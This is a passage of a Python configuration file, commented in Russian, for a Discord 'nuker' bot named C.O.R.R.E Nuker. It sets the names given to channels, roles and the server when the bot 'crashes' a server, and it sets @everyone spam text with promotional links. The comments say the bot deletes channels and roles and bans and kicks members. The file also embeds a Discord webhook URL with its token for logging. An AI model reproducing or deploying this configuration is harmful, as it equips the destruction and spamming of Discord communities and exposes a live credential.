...
# подробные настройки
channelsn = 'crash-by-C.O.R.R.E-nuker' #имя каналов при краше
rolesn = 'Crash By C.O.R.R.E Nuker'#имя ролей при краше
namen = 'Crashed By C.O.R.R.E Nuker'#имя сервера при краше
iconn = 'icon.PNG' # не трогайте лучше
hooknamen = 'Crashed By C.O.R.R.E Nuker'#имя хуков
botnamen = 'C.O.R.R.E Nuker'#тип имя бота
inviten = 'discord.gg/gaysexcorre' # тут ссылка на ваш сервер
telegram = 'https://t.me/crashbotss' # тут сылка на телегу
spamtextn = f'@everyone\nДанный сервер крашиться ботом C.O.R.R.E Nuker\nТелеграм: {telegram}\nСервер поддержки: {inviten}'
admins = [852695075410149436] # тут укажи id админов (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
reasonn = 'Crash by C.O.R.R.E Nuker' # причина удаления ролей,каналов, бана и кика участников
loghook = 'https://discord.com/api/webhooks/933737191488749579/izik0v8gdIEoqGMB7v-GWqqntuYqKfIbyDSqNU0faMp2326Py-F6KPMoaF-HdIZrecSW'# ссылка на вебхук с логами
